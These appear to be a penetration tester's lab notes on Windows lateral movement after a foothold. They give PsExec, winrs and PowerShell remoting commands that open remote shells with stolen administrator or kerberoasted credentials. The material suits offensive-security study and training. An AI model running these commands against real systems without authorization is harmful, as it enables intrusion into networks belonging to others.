### Psexec
Allows remote process excecution trough port 445 (SMB)
``` bash
#Target Machine after foothold for lateral movement
psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe
```
### Remote Process Creation Using WinRM
Used to send Powershell commands to Windows hosts remotely. 
``` bash
winrs.exe -u:Administrator -p:Mypass123 -r:target cmd
```
Same with powershell
``` powershell
#create a PSCredential object:
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;

#Once we have our PSCredential object, we can create an interactive session using the Enter-PSSession cmdlet:
Enter-PSSession -Computername TARGET -Credential $credential
```
### PSCredential Object
``` powershell
#ex when you have creds from kerberoasting
#Create object
$user = "<DOMAIN>\<USER>"  
$Password = ConvertTo-SecureString "<PASSWD>" -AsPlainText -Force  
$credentials = New-Object System.Management.Automation.PSCredential ($user, $Password)
#Login as user
Enter-PSSession -ComputerName "<MACHINE>.<DOMAIN>.local" -Credential $credentials
```